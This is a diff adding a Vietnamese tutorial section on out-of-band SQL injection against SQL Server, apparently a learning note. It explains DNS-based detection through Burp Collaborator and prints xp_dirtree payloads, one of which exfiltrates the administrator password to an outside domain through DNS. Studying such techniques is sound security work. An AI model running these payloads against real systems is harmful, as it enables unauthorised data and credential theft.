@@ -179,3 +179,65 @@ WHERE TrackingId = '<b>xyz' AND '1'='1</b>'</pre>
 <p>→ Hacker đã lấy được password chỉ bằng lỗi.</p>
 
 
+<h2>5. Out-of-band SQLi (OAST)</h2>
+<h3>5.1. Khi nào dùng OAST?</h3>
+<p>Dùng OAST khi TẤT CẢ kỹ thuật khác đều vô dụng:</p>
+<ul>
+  <li>Boolean-based không hoạt động</li>
+  <li>Error-based không hiện lỗi</li>
+  <li>Time-based không tạo delay</li>
+  <li>Ứng dụng chạy SQL asynchronous (luồng khác)</li>
+  <li>Response của ứng dụng không phụ thuộc SQL query</li>
+</ul>
+
+<h3>5.2. Mục tiêu của OAST</h3>
+<p>Thay vì tìm dấu hiệu trong response, ta tìm dấu hiệu trên server của chính mình.</p>
+<p>Ta ép database:</p>
+<ul>
+  <li>gửi DNS request</li>
+  <li>hoặc gửi HTTP/SMB request</li>
+</ul>
+<p>đến server bạn kiểm soát.</p>
+<p>→ Nếu thấy request → SQL Injection tồn tại.</p>
+
+<h3>5.3. Vì sao thường dùng DNS?</h3>
+<ul>
+  <li>DNS luôn được phép đi ra internet trong hầu hết hệ thống</li>
+  <li>DNS rất khó bị chặn</li>
+  <li>Gửi rất nhẹ → nhanh → đáng tin cậy</li>
+  <li>Dễ encode dữ liệu vào subdomain để exfiltrate</li>
+</ul>
+<p>→ DNS là kênh “leak dữ liệu” hiệu quả nhất cho OAST.</p>
+
+<h3>5.4. Burp Collaborator</h3>
+<p>Burp Collaborator cung cấp:</p>
+<ul>
+  <li>1 domain riêng</li>
+  <li>log DNS/HTTP/SMTP request</li>
+</ul>
+<p>=> Burp Suite Pro tự động poll kết quả, nhẹ, ổn định, dễ dùng; Không cần tự dựng server hay DNS recorder.</p>
+
+<h3>5.5. Ý tưởng hoạt động (Luồng cơ bản)</h3>
+<p>Bước 1: Gửi payload gây DNS lookup<br>Bước 2: Database chạy lệnh → gửi request đến Collaborator<br>Bước 3: Collaborator log lại request<br>Bước 4: Bạn kiểm tra log</p>
+
+<h3>5.6. Payload và cách nó hoạt động (SQL Server)</h3>
+<p>Payload:</p>
+<pre>'; exec master..xp_dirtree '//abc123.burpcollaborator.net/a'--</pre>
+<ul>
+  <li>xp_dirtree truy cập UNC path.</li>
+  <li>Trước khi truy cập UNC → hệ thống phải resolve DNS của host.</li>
+  <li>Vì host = abc123.burpcollaborator.net → Database gửi DNS lookup ra ngoài.</li>
+</ul>
+<p>Kết quả: Collaborator ghi lại DNS request → thành công.</p>
+
+<h3>5.7. Exfiltration dữ liệu bằng OAST</h3>
+<p>OAST không chỉ xác nhận SQLi. Nó còn lấy cắp dữ liệu DB bằng tên miền DNS.</p>
+<p>Ví dụ:</p>
+<pre>'; exec master..xp_dirtree '//'+(SELECT password FROM users WHERE username='administrator')+'.id.burpcollab.net'--</pre>
+<p>Database sẽ gửi DNS request tới <code><password>.id.burpcollab.net</code></p>
+<p>→ Bạn đọc password ngay trong DNS log.</p>
+
+
+
+
+
